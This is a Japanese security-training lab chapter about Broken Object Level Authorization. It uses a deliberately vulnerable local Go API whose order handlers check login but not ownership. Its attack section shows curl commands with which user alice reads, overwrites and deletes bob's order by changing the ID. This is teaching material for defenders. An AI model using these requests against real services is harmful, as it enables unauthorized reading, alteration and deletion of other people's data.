# 00. BOLA (Broken Object Level Authorization)

## 前提

`stage0-bola`は`/orders/{id}`というAPIリソースを、セッションCookieで保護している。ログインしていなければ401になる。ここまでは正しい。

```
go run ./cmd/stage0-bola
```

## 理論

`cmd/stage0-bola/main.go`の`handleGetOrder`, `handleReplaceOrder`, `handleDeleteOrder`を見る。3つとも`requireSession`でラップされ、ログイン済みかどうかは確認している。しかしハンドラの中では**注文の`Owner`とセッションの`Username`を一度も比較していない**。IDが分かれば、ログイン済みの誰でも他人の注文を読める・書き換えられる・消せる。

これがBOLA(OWASP API Security Top 10のAPI1) — 「認証(誰か)」と「認可(その対象への権限があるか)」を別物として扱えていない設計ミス。認証だけを実装して満足すると、システム全体としては「ログインさえすれば何でもできる」になる。番号やUUIDが連番・推測可能かどうかは本質ではない — 推測できなくてもURLを1つ知っていれば突破できる。

## 攻撃

まず自分(alice)としてログインし、自分の注文`1001`が読めることを確認する。

```
curl -c /tmp/alice.txt -X POST localhost:8080/login \
  -d '{"Username":"alice","Password":"password123"}'

curl -b /tmp/alice.txt localhost:8080/orders/1001
```

次に、bobの注文`1002`をIDだけで読んでみる。

```
curl -i -b /tmp/alice.txt localhost:8080/orders/1002
```

`alice`のセッションのまま`bob`の注文が返ってくる。読めるだけでなく、書き換え・削除も同じセッションで通る。

```
curl -i -b /tmp/alice.txt -X PUT localhost:8080/orders/1002 \
  -d '{"Item":"tampered","Amount":1}'

curl -i -b /tmp/alice.txt -X DELETE localhost:8080/orders/1002
```

## 何が起きたか

セッションの検証ロジック自体は壊れていない。壊れているのは「検証した後、その本人がこのオブジェクトに対して何をしていいか」を一度も聞いていないこと。認証(Authentication)と認可(Authorization)は別の工程であり、片方を実装しても他方の代わりにはならない。修正は07章で見る。
